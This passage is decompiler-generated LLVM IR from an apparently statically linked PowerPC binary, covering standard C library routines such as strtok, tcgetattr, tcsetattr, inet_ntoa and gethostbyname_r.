  %v0_1000fb2c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000fb2c = inttoptr i32 %v0_1000fb2c to i8*
  %v2_1000fb2c = load i8, i8* %v1_1000fb2c, align 1
  %v3_1000fb2c = zext i8 %v2_1000fb2c to i32
  %v1_1000fb30 = add i32 %v0_1000fb2c, 1
  store i32 %v1_1000fb30, i32* %r8.global-to-local, align 4
  %v0_1000fb34 = load i32, i32* %r0.global-to-local, align 4
  %v4_1000fb34 = icmp eq i32 %v0_1000fb34, %v3_1000fb2c
  br i1 %v4_1000fb34, label %dec_label_pc_1000fb18.backedge, label %dec_label_pc_1000fb40

dec_label_pc_1000fb18.backedge:                   ; preds = %dec_label_pc_1000fb18, %dec_label_pc_1000fb40, %dec_label_pc_1000fb54
  %v0_1000fb18.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000fb18

dec_label_pc_1000fb40:                            ; preds = %dec_label_pc_1000fb18
  %v1_1000fb38 = mul nuw nsw i32 %v3_1000fb2c, 2
  %v0_1000fb40 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000fb40 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000fb40 = add i32 %v1_1000fb40, %v0_1000fb40
  %v3_1000fb40 = inttoptr i32 %v2_1000fb40 to i16*
  %v4_1000fb40 = load i16, i16* %v3_1000fb40, align 2
  %v5_1000fb40 = sext i16 %v4_1000fb40 to i32
  store i32 %v5_1000fb40, i32* %r9.global-to-local, align 4
  %v2_1000fb48 = add i32 %v1_1000fb40, %v1_1000fb38
  %v3_1000fb48 = inttoptr i32 %v2_1000fb48 to i16*
  %v4_1000fb48 = load i16, i16* %v3_1000fb48, align 2
  %v5_1000fb48 = sext i16 %v4_1000fb48 to i32
  store i32 %v5_1000fb48, i32* %r0.global-to-local, align 4
  %v4_1000fb4c = icmp eq i16 %v4_1000fb40, %v4_1000fb48
  br i1 %v4_1000fb4c, label %dec_label_pc_1000fb18.backedge, label %dec_label_pc_1000fb54

dec_label_pc_1000fb54:                            ; preds = %dec_label_pc_1000fb40
  %v3_1000fb44 = icmp eq i8 %v2_1000fb2c, 0
  %v0_1000fb54 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000fb54 = add i32 %v0_1000fb54, 1
  store i32 %v1_1000fb54, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  store i32 %v1_1000fb54, i32* %r8.global-to-local, align 4
  br i1 %v3_1000fb44, label %dec_label_pc_1000fb64, label %dec_label_pc_1000fb18.backedge

dec_label_pc_1000fb64:                            ; preds = %dec_label_pc_1000fb54
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000fb18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fb18.backedge, { 2, 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1002c920.1065 to i32), i32* @r5, align 4
  %v1_1000fb74 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_1002c920.1065 to i32))
  ret i32 %v1_1000fb74
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268499852, i32* @lr, align 4
  %v2_1000fb88 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_3()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000fba8 = load i32, i32* @lr, align 4
  store i32 %v0_1000fba8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000fbb8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268499916, i32* @lr, align 4
  %v3_1000fbc8 = call i32 @ioctl(i32 1076655123, i32 %v2_1000fbb8, i32 %v2_1000fbb8)
  %v2_1000fbcc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000fbcc, i32* @r4, align 4
  store i32 %v3_1000fbc8, i32* @r30, align 4
  %v3_1000fbd0 = icmp eq i32 %v3_1000fbc8, 0
  store i32 19, i32* @r5, align 4
  %v0_1000fbd8 = load i32, i32* @r31, align 4
  br i1 %v3_1000fbd0, label %dec_label_pc_1000fbe0, label %dec_label_pc_1000fc28

dec_label_pc_1000fbe0:                            ; preds = %entry
  %v1_1000fbd8 = add i32 %v0_1000fbd8, 17
  %v3_1000fbf8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000fbf8, i32* %r0.global-to-local, align 4
  %v2_1000fbfc = add i32 %v0_1000fbd8, 4
  %v3_1000fbfc = inttoptr i32 %v2_1000fbfc to i32*
  store i32 %tmp7, i32* %v3_1000fbfc, align 4
  %v0_1000fc00 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000fc00 = load i32, i32* @r31, align 4
  %v2_1000fc00 = inttoptr i32 %v1_1000fc00 to i32*
  store i32 %v0_1000fc00, i32* %v2_1000fc00, align 4
  %v0_1000fc04 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fc04 = load i32, i32* @r31, align 4
  %v2_1000fc04 = add i32 %v1_1000fc04, 8
  %v3_1000fc04 = inttoptr i32 %v2_1000fc04 to i32*
  store i32 %v0_1000fc04, i32* %v3_1000fc04, align 4
  %v0_1000fc08 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000fc08 = load i32, i32* @r31, align 4
  %v2_1000fc08 = add i32 %v1_1000fc08, 12
  %v3_1000fc08 = inttoptr i32 %v2_1000fc08 to i32*
  store i32 %v0_1000fc08, i32* %v3_1000fc08, align 4
  %v3_1000fc0c = load i32, i32* @r31, align 4
  %v4_1000fc0c = add i32 %v3_1000fc0c, 16
  %v5_1000fc0c = inttoptr i32 %v4_1000fc0c to i8*
  store i8 %tmp4, i8* %v5_1000fc0c, align 1
  %v1_1000fc10 = load i32, i32* @r31, align 4
  %v2_1000fc10 = add i32 %v1_1000fc10, 52
  %v3_1000fc10 = inttoptr i32 %v2_1000fc10 to i32*
  store i32 %tmp3, i32* %v3_1000fc10, align 4
  %v1_1000fc14 = load i32, i32* @r31, align 4
  %v2_1000fc14 = add i32 %v1_1000fc14, 56
  %v3_1000fc14 = inttoptr i32 %v2_1000fc14 to i32*
  store i32 %tmp2, i32* %v3_1000fc14, align 4
  store i32 268499996, i32* @lr, align 4
  %v6_1000fc18 = sext i8 %tmp4 to i32
  %v8_1000fc18 = call i32 @__GI_mempcpy(i32 %v1_1000fbd8, i32 %v2_1000fbcc, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000fc18, i32 %tmp7)
  store i32 268500008, i32* @lr, align 4
  %v3_1000fc24 = call i32 @__GI_memset(i32 %v8_1000fc18, i32 0, i32 13)
  %v0_1000fc2c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000fc28

dec_label_pc_1000fc28:                            ; preds = %entry, %dec_label_pc_1000fbe0
  %v0_1000fc2c = phi i32 [ %v3_1000fbc8, %entry ], [ %v0_1000fc2c.pre, %dec_label_pc_1000fbe0 ]
  store i32 %v0_1000fba8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000fc2c

; uselistorder directives
  uselistorder i32 %v2_1000fbb8, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc28, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000fc40 = load i32, i32* @r4, align 4
  %v3_1000fc40 = icmp eq i32 %v0_1000fc40, 1
  %v0_1000fc50 = load i32, i32* @r3, align 4
  store i32 %v0_1000fc50, i32* @r27, align 4
  %v0_1000fc58 = load i32, i32* @r5, align 4
  store i32 %v0_1000fc58, i32* @r31, align 4
  br i1 %v3_1000fc40, label %dec_label_pc_1000fc7c, label %dec_label_pc_1000fc60

dec_label_pc_1000fc60:                            ; preds = %entry
  %v3_1000fc60 = icmp eq i32 %v0_1000fc40, 2
  br i1 %v3_1000fc60, label %dec_label_pc_1000fc9c, label %dec_label_pc_1000fc68

dec_label_pc_1000fc68:                            ; preds = %dec_label_pc_1000fc60
  %v3_1000fc68 = icmp eq i32 %v0_1000fc40, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000fc68, label %dec_label_pc_1000fca4, label %dec_label_pc_1000fc88

dec_label_pc_1000fc7c:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000fca4

dec_label_pc_1000fc88:                            ; preds = %dec_label_pc_1000fc68
  %v0_1000fc88 = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1000fc94 = inttoptr i32 %v0_1000fc88 to i32*
  store i32 22, i32* %v2_1000fc94, align 4
  br label %dec_label_pc_1000fd8c

dec_label_pc_1000fc9c:                            ; preds = %dec_label_pc_1000fc60
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000fca4

dec_label_pc_1000fca4:                            ; preds = %dec_label_pc_1000fc68, %dec_label_pc_1000fc7c, %dec_label_pc_1000fc9c
  %v1_1000fca4 = inttoptr i32 %v0_1000fc58 to i32*
  %v2_1000fca4 = load i32, i32* %v1_1000fca4, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000fcac = add i32 %v0_1000fc58, 4
  %v2_1000fcac = inttoptr i32 %v1_1000fcac to i32*
  %v3_1000fcac = load i32, i32* %v2_1000fcac, align 4
  store i32 %v3_1000fcac, i32* %r9.global-to-local, align 4
  %v1_1000fcb0 = add i32 %v0_1000fc58, 17
  store i32 %v1_1000fcb0, i32* @r4, align 4
  %v1_1000fcb4 = add i32 %v0_1000fc58, 8
  %v2_1000fcb4 = inttoptr i32 %v1_1000fcb4 to i32*
  %v3_1000fcb4 = load i32, i32* %v2_1000fcb4, align 4
  %v2_1000fcb8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000fcb8, i32* @r3, align 4
  %v2_1000fcc0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000fcc0, i32* @r26, align 4
  store i32 %v2_1000fca4, i32* %stack_var_-72, align 4
  store i32 268500208, i32* @lr, align 4
  %v0_1000fcec = call i32 @memcpy()
  %v0_1000fcf0 = load i32, i32* @r27, align 4
  %v0_1000fcf4 = load i32, i32* @r30, align 4
  store i32 268500228, i32* @lr, align 4
  %v3_1000fd00 = call i32 @ioctl(i32 %v0_1000fcf0, i32 %v0_1000fcf4, i32 %v2_1000fcc0)
  store i32 %v3_1000fd00, i32* @r28, align 4
  %v3_1000fd04 = icmp eq i32 %v3_1000fd00, 0
  br i1 %v3_1000fd04, label %dec_label_pc_1000fd0c, label %dec_label_pc_1000fd8c

dec_label_pc_1000fd0c:                            ; preds = %dec_label_pc_1000fca4
  %v0_1000fd0c = load i32, i32* @r30, align 4
  %v3_1000fd10 = icmp eq i32 %v0_1000fd0c, -2144570348
  br i1 %v3_1000fd10, label %dec_label_pc_1000fd18, label %dec_label_pc_1000fd88

dec_label_pc_1000fd18:                            ; preds = %dec_label_pc_1000fd0c
  %v0_1000fd18 = call i32 @__errno_location()
  store i32 %v0_1000fd18, i32* @r29, align 4
  %v0_1000fd28 = load i32, i32* @r27, align 4
  %v1_1000fd30 = inttoptr i32 %v0_1000fd18 to i32*
  %v2_1000fd30 = load i32, i32* %v1_1000fd30, align 4
  store i32 %v2_1000fd30, i32* @r30, align 4
  store i32 268500284, i32* @lr, align 4
  %v3_1000fd38 = call i32 @ioctl(i32 %v0_1000fd28, i32 1076655123, i32 %v2_1000fcc0)
  %v3_1000fd3c = icmp eq i32 %v3_1000fd38, 0
  br i1 %v3_1000fd3c, label %dec_label_pc_1000fd4c, label %dec_label_pc_1000fd44

dec_label_pc_1000fd44:                            ; preds = %dec_label_pc_1000fd18
  %v0_1000fd44 = load i32, i32* @r30, align 4
  %v1_1000fd44 = load i32, i32* @r29, align 4
  %v2_1000fd44 = inttoptr i32 %v1_1000fd44 to i32*
  store i32 %v0_1000fd44, i32* %v2_1000fd44, align 4
  br label %dec_label_pc_1000fd8c

dec_label_pc_1000fd4c:                            ; preds = %dec_label_pc_1000fd18
  %v0_1000fd4c = load i32, i32* @r31, align 4
  %v1_1000fd4c = add i32 %v0_1000fd4c, 8
  %v2_1000fd4c = inttoptr i32 %v1_1000fd4c to i32*
  %v3_1000fd4c = load i32, i32* %v2_1000fd4c, align 4
  %v1_1000fd54 = call i32 @__asm_rlwinm(i32 %v3_1000fd4c, i32 0, i32 19, i32 20)
  %v1_1000fd58 = call i32 @__asm_rlwinm(i32 %v3_1000fcb4, i32 0, i32 19, i32 20)
  store i32 %v1_1000fd58, i32* %r9.global-to-local, align 4
  %v4_1000fd5c = icmp eq i32 %v1_1000fd54, %v1_1000fd58
  br i1 %v4_1000fd5c, label %dec_label_pc_1000fd64, label %dec_label_pc_1000fd78

dec_label_pc_1000fd64:                            ; preds = %dec_label_pc_1000fd4c
  %v1_1000fd64 = and i32 %v3_1000fd4c, 768
  store i32 %v1_1000fd64, i32* %r9.global-to-local, align 4
  %v3_1000fd64 = icmp eq i32 %v1_1000fd64, 0
  br i1 %v3_1000fd64, label %dec_label_pc_1000fd88, label %dec_label_pc_1000fd6c

dec_label_pc_1000fd6c:                            ; preds = %dec_label_pc_1000fd64
  %v1_1000fd6c = call i32 @__asm_rlwinm(i32 %v3_1000fcb4, i32 0, i32 22, i32 23)
  %v0_1000fd70 = load i32, i32* %r9.global-to-local, align 4
  %v4_1000fd70 = icmp eq i32 %v0_1000fd70, %v1_1000fd6c
  br i1 %v4_1000fd70, label %dec_label_pc_1000fd88, label %dec_label_pc_1000fd78

dec_label_pc_1000fd78:                            ; preds = %dec_label_pc_1000fd4c, %dec_label_pc_1000fd6c
  store i32 -1, i32* @r28, align 4
  %v1_1000fd80 = load i32, i32* @r29, align 4
  %v2_1000fd80 = inttoptr i32 %v1_1000fd80 to i32*
  store i32 22, i32* %v2_1000fd80, align 4
  br label %dec_label_pc_1000fd8c

dec_label_pc_1000fd88:                            ; preds = %dec_label_pc_1000fd0c, %dec_label_pc_1000fd6c, %dec_label_pc_1000fd64
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000fd8c

dec_label_pc_1000fd8c:                            ; preds = %dec_label_pc_1000fca4, %dec_label_pc_1000fd44, %dec_label_pc_1000fc88, %dec_label_pc_1000fd78, %dec_label_pc_1000fd88
  %v0_1000fd90 = load i32, i32* @r28, align 4
  ret i32 %v0_1000fd90

; uselistorder directives
  uselistorder i32 %v0_1000fc58, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 3 }
  uselistorder i32 19, { 5, 6, 7, 0, 8, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_1000fd8c, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fd88, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000fd78, { 1, 0 }
  uselistorder label %dec_label_pc_1000fca4, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000fda4 = load i32, i32* @r3, align 4
  ret i32 %v0_1000fda4
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1000fda8 = load i32, i32* @r3, align 4
  ret i32 %v0_1000fda8
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000fdac = load i32, i32* @r3, align 4
  ret i32 %v0_1000fdac
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000fdb0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000fdb0
}

define i32 @hstrerror(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1000fdb4 = icmp ugt i32 %arg1, 4
  br i1 %v2_1000fdb4, label %dec_label_pc_1000fdd4, label %dec_label_pc_1000fdc8

dec_label_pc_1000fdc8:                            ; preds = %entry
  %v1_1000fdc0 = mul i32 %arg1, 4
  %v2_1000fdd0 = add i32 %v1_1000fdc0, ptrtoint ([5 x i8*]* @global_var_1001bf0c.1072 to i32)
  %v3_1000fdd0 = inttoptr i32 %v2_1000fdd0 to i32*
  %v4_1000fdd0 = load i32, i32* %v3_1000fdd0, align 4
  br label %dec_label_pc_1000fdd4

dec_label_pc_1000fdd4:                            ; preds = %entry, %dec_label_pc_1000fdc8
  %v0_1000fdd4 = phi i32 [ ptrtoint ([15 x i8]* @global_var_1001bf20.1066 to i32), %entry ], [ %v4_1000fdd0, %dec_label_pc_1000fdc8 ]
  ret i32 %v0_1000fdd4

; uselistorder directives
  uselistorder label %dec_label_pc_1000fdd4, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000fde0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v4_1000fdec = icmp eq i8* %arg1, null
  store i32 ptrtoint (i32* @global_var_1001bf32.1073 to i32), i32* %r30.global-to-local, align 4
  br i1 %v4_1000fdec, label %dec_label_pc_1000fe10, label %dec_label_pc_1000fdfc

dec_label_pc_1000fdfc:                            ; preds = %entry
  %v2_1000fdfc = load i8, i8* %arg1, align 1
  %v3_1000fe00 = icmp eq i8 %v2_1000fdfc, 0
  br i1 %v3_1000fe00, label %dec_label_pc_1000fe10, label %dec_label_pc_1000fe08

dec_label_pc_1000fe08:                            ; preds = %dec_label_pc_1000fdfc
  store i32 ptrtoint ([3 x i8]* @global_var_1001bf30.1074 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000fe10

dec_label_pc_1000fe10:                            ; preds = %dec_label_pc_1000fdfc, %entry, %dec_label_pc_1000fe08
  %v0_1000fe10 = call i32 @__GI___h_errno_location()
  %v1_1000fe18 = inttoptr i32 %v0_1000fe10 to i32*
  %v2_1000fe18 = load i32, i32* %v1_1000fe18, align 4
  %v2_1000fe20 = icmp ugt i32 %v2_1000fe18, 4
  br i1 %v2_1000fe20, label %dec_label_pc_1000fe38, label %dec_label_pc_1000fe2c

dec_label_pc_1000fe2c:                            ; preds = %dec_label_pc_1000fe10
  br label %dec_label_pc_1000fe38

dec_label_pc_1000fe38:                            ; preds = %dec_label_pc_1000fe10, %dec_label_pc_1000fe2c
  %v3_1000fe44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -14148) to i32*), align 4
  store i32 %v3_1000fe44, i32* @r3, align 4
  store i32 %v0_1000fde0, i32* @lr, align 4
  %v0_1000fe4c = load i32, i32* %r31.global-to-local, align 4
  %v0_1000fe50 = load i32, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001be98.1075 to i32), i32* @r4, align 4
  %v7_1000fe64 = call i32 @fprintf(i32 %v3_1000fe44, i32 ptrtoint ([8 x i8]* @global_var_1001be98.1075 to i32), i32 %v0_1000fe4c, i32 %v0_1000fe50, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  ret i32 %v7_1000fe64

; uselistorder directives
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000fe38, { 1, 0 }
  uselistorder label %dec_label_pc_1000fe10, { 2, 0, 1 }
}

define i32 @__GI_inet_ntoa_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1000fe70 = add i32 %arg2, 15
  store i32 %v1_1000fe70, i32* %r4.global-to-local, align 4
  %v2_1000fe84 = load i32, i32* %arg1, align 4
  store i32 %v2_1000fe84, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fe8c

dec_label_pc_1000fe8c:                            ; preds = %dec_label_pc_1000feb0.dec_label_pc_1000fe8c_crit_edge, %entry
  %v0_1000fe8c = phi i32 [ %v2_1000fe84, %entry ], [ %v0_1000fe8c.pre, %dec_label_pc_1000feb0.dec_label_pc_1000fe8c_crit_edge ]
  %v0_1000fed08 = phi i32 [ %v1_1000fe70, %entry ], [ %v0_1000feb0, %dec_label_pc_1000feb0.dec_label_pc_1000fe8c_crit_edge ]
  %v1_1000fe8c = urem i32 %v0_1000fe8c, 256
  %v5_1000fe94 = inttoptr i32 %v0_1000fed08 to i8*
  %v6_1000fe94 = call i32 @_uintmaxtostr(i8* %v5_1000fe94, i32 0, i32 %v1_1000fe8c, i32 -10, i32 0)
  %v0_1000fe98 = load i32, i32* @r30, align 4
  %v3_1000fe98 = icmp eq i32 %v0_1000fe98, 0
  %v0_1000fe9c = load i32, i32* @r31, align 4
  %v1_1000fe9c = udiv i32 %v0_1000fe9c, 256
  store i32 %v1_1000fe9c, i32* %r31.global-to-local, align 4
  %v1_1000fea0 = add i32 %v6_1000fe94, -1
  store i32 %v1_1000fea0, i32* %r4.global-to-local, align 4
  br i1 %v3_1000fe98, label %dec_label_pc_1000feb0, label %dec_label_pc_1000fea8

dec_label_pc_1000fea8:                            ; preds = %dec_label_pc_1000fe8c
  %v3_1000feac = inttoptr i32 %v0_1000fe98 to i8*
  store i8 46, i8* %v3_1000feac, align 1
  %v0_1000feb0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000feb0

dec_label_pc_1000feb0:                            ; preds = %dec_label_pc_1000fe8c, %dec_label_pc_1000fea8
  %v0_1000feb0 = phi i32 [ %v1_1000fea0, %dec_label_pc_1000fe8c ], [ %v0_1000feb0.pre, %dec_label_pc_1000fea8 ]
  %v0_1000feb4.pre = load i32, i32* @r29, align 4
  %v1_1000fec4 = add i32 %v0_1000feb4.pre, 1
  store i32 %v1_1000fec4, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1000feb4.pre, 4
  br i1 %tmp7, label %dec_label_pc_1000feb0.dec_label_pc_1000fe8c_crit_edge, label %dec_label_pc_1000fecc

dec_label_pc_1000feb0.dec_label_pc_1000fe8c_crit_edge: ; preds = %dec_label_pc_1000feb0
  %v0_1000fe8c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fe8c

dec_label_pc_1000fecc:                            ; preds = %dec_label_pc_1000feb0
  %v1_1000fed0 = add i32 %v0_1000feb0, 1
  ret i32 %v1_1000fed0

; uselistorder directives
  uselistorder i32 %v0_1000feb4.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000feb0, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_1000fef8 = load i32, i32* %arg1, align 4
  store i32 %v2_1000fef8, i32* %stack_var_-8, align 4
  store i32 268500744, i32* @lr, align 4
  %v3_1000ff04 = call i32 @__GI_inet_ntoa_r(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_10032980.1076 to i32))
  ret i32 %v3_1000ff04
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000ff20 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000ff20, i32* @r4, align 4
  store i32 268500780, i32* @lr, align 4
  %v1_1000ff28 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000ff28 = call i32 @inet_aton(i8* %v1_1000ff28)
  %v3_1000ff2c = icmp eq i32 %v2_1000ff28, 0
  br i1 %v3_1000ff2c, label %dec_label_pc_1000ff3c, label %dec_label_pc_1000ff38

dec_label_pc_1000ff38:                            ; preds = %entry
  %v3_1000ff38 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000ff3c

dec_label_pc_1000ff3c:                            ; preds = %entry, %dec_label_pc_1000ff38
  %v0_1000ff48 = phi i32 [ -1, %entry ], [ %v3_1000ff38, %dec_label_pc_1000ff38 ]
  ret i32 %v0_1000ff48

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ff3c, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000ff60 = call i32 @__GI___h_errno_location()
  %v2_1000ff70 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268500872, i32* @lr, align 4
  %v7_1000ff84 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_10032b5c.1077, i32 ptrtoint (i32* @global_var_10032990.1078 to i32), i32 460, i32 %v2_1000ff70, i32 %v0_1000ff60)
  %v3_1000ff8c = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1000ff8c
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000ffa4 = load i32, i32* @lr, align 4
  store i32 %v0_1000ffa4, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1000ffac = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1000ffcc = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1000ffcc, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1000ffac, label %dec_label_pc_100102d0, label %dec_label_pc_1000ffd8

dec_label_pc_1000ffd8:                            ; preds = %entry
  %v0_1000ffd8 = call i32 @__errno_location()
  store i32 %v0_1000ffd8, i32* %r3.global-to-local, align 4
  %v1_1000ffe0 = inttoptr i32 %v0_1000ffd8 to i32*
  %v2_1000ffe0 = load i32, i32* %v1_1000ffe0, align 4
  store i32 %v2_1000ffe0, i32* @r27, align 4
  store i32 %v0_1000ffd8, i32* %r28.global-to-local, align 4
  %v0_1000ffe8 = load i32, i32* @r31, align 4
  store i32 %v0_1000ffe8, i32* %v1_1000ffe0, align 4
  %v0_1000ffec = load i32, i32* %r26.global-to-local, align 4
  %v0_1000fff0 = load i32, i32* @r23, align 4
  store i32 %v0_1000fff0, i32* %r3.global-to-local, align 4
  %v0_1000fff4 = load i32, i32* %r30.global-to-local, align 4
  %v0_1000fff8 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000fffc = load i32, i32* %r20.global-to-local, align 4
  %v0_10010000 = load i32, i32* @r24, align 4
  store i32 268501000, i32* @lr, align 4
  %v7_10010004 = call i32 @__get_hosts_byname_r(i32 %v0_1000fff0, i32 2, i32 %v0_1000ffec, i32 %v0_1000fff4, i32 %v0_1000fff8, i32 %v0_1000fffc, i32 %v0_10010000)
  store i32 %v7_10010004, i32* %r3.global-to-local, align 4
  %v3_10010008 = icmp eq i32 %v7_10010004, 0
  br i1 %v3_10010008, label %dec_label_pc_100102d0, label %dec_label_pc_10010010

dec_label_pc_10010010:                            ; preds = %dec_label_pc_1000ffd8
  %v0_10010010 = load i32, i32* @r24, align 4
  %v1_10010010 = inttoptr i32 %v0_10010010 to i32*
  %v2_10010010 = load i32, i32* %v1_10010010, align 4
  store i32 %v2_10010010, i32* %r0.global-to-local, align 4
  %v3_10010014 = icmp eq i32 %v2_10010010, 1
  br i1 %v3_10010014, label %dec_label_pc_10010038, label %dec_label_pc_1001001c

dec_label_pc_1001001c:                            ; preds = %dec_label_pc_10010010
  %v3_1001001c = icmp eq i32 %v2_10010010, 4
  br i1 %v3_1001001c, label %dec_label_pc_10010038, label %dec_label_pc_10010024

dec_label_pc_10010024:                            ; preds = %dec_label_pc_1001001c
  %v3_10010024 = icmp eq i32 %v2_10010010, -1
